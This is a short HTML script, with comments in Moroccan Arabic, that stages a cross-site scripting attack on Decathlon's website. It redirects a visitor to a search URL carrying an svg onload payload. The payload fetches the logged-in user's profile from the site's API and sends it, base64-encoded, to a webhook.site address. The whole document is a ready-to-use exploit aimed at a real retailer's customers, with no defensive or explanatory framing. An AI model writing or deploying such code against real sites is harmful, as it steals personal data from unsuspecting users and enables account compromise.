<script>
    // هاد الكود كيدير الـ Payload بـ رموز ما كيبلكيهاش المتصفح
    // الهدف: يدخل لـ Decathlon، ينفذ الـ XSS، ويصيفط الداتا لـ Webhook
    
    let payload = "fetch('https://www.decathlon.com/api/v1/user/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data='+btoa(d)))";
    
    // تحويل الكود لـ URL safe
    let target = "https://www.decathlon.com/search?q=<svg/onload=eval(atob('" + btoa(payload) + "'))>";
    
    window.location.href = target;
</script>
